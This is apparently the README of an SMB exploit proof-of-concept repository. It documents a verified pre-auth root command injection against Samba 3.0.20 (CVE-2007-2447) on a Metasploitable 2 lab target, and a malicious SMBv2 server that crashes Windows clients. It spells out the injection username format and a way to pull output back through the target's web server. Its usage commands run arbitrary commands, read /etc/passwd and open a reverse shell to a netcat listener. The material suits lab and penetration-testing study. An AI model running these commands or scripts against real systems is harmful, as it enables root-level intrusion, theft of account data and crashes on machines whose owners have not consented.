# SMB exploit PoCs

Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
testing only — do not run against systems you do not own.

## Repository layout

```
cve-2007-2447/
  cve_2007_2447.py       Samba pre-auth RCE (works, verified)
cve-2009-3103/
  cve_2009_3103_smbv2_server.py   Malicious SMBv2 server (crashes Windows clients)
smb_test_server.py       Benign SMB1 protocol test server (not an exploit)
README.md                This file — shared by all folders
```

## cve-2007-2447/ — Samba pre-auth RCE (works, verified)

A working pre-auth remote command execution client for the Samba service on
**Metasploitable 2** (Samba 3.0.20-Debian). This is the same vector as the
Metasploit module `exploit/multi/samba/usermap_script`.

Metasploitable 2's `smb.conf` enables the non-default
`username map script = /etc/scripts/usermap.sh` option. Samba invokes that
mapping script through the shell with the attacker-supplied username **before
authentication**, so shell metacharacters in the username execute as the
`smbd` process — which runs as **root** on Metasploitable 2.

The client sends an SMB1 `Session Setup AndX` (WordCount=13, zero-length
LM/NT hashes, matching Metasploit's `session_setup_no_ntlmssp`) with the
username ``/=`nohup <command>` ``. Verified against Metasploitable 2:
`uid=0(root) gid=0(root)` on ports 445 and 139.

Command output is exfiltrated by writing to `/var/www/` on the target and
fetching it over the target's own HTTP server (port 80), then the drop file
is cleaned up with a second injection.

```bash
# Fingerprint: guest login for the Samba banner + vulnerability range
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --check

# Default demo: fingerprint + run `id` and print the output
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132

# Run any command; output is retrieved automatically
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "uname -a && cat /etc/passwd"

# Use NetBIOS port 139 instead of 445
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --port 139 --cmd "id"

# Reverse shell (start a listener first: nc -lvnp 4444)
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444

# Skip HTTP retrieval (command still runs; output stays on the target)
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "id" --no-verify
```

No third-party packages — standard library only (Python 3).

## cve-2009-3103/ — Windows SMBv2 client crash (NOT for Samba)

A malicious SMBv2 **server** (Exploit-DB #41222) that crashes vulnerable
Windows SMBv2 **clients** (`srv2.sys`) via a Tree Connect response overflow.
It **cannot** be used to attack a Samba server: Samba 3.0.20 speaks only
SMB1, and the overflow lives in Microsoft's client code. Use it only against
a consenting Windows client in a lab.

```bash
# Listens on port 445; requires admin/root to bind
python cve-2009-3103/cve_2009_3103_smbv2_server.py
```

Ported to Python 3 (`collections.OrderedDict`, bytes-safe packet building).

## smb_test_server.py — benign protocol test server

A small standalone SMB1 test/echo server for protocol experiments. Not an
exploit.

## Lab setup used for verification

- Target: Metasploitable 2 at `192.168.200.132` (VMware, host-only/NAT)
- Host: any machine on the same network with Python 3
- Open ports on target: 22, 80, 139, 445, 3632

## License

Proof-of-concept scripts derived from public exploit databases. Use
responsibly and only in authorized environments.
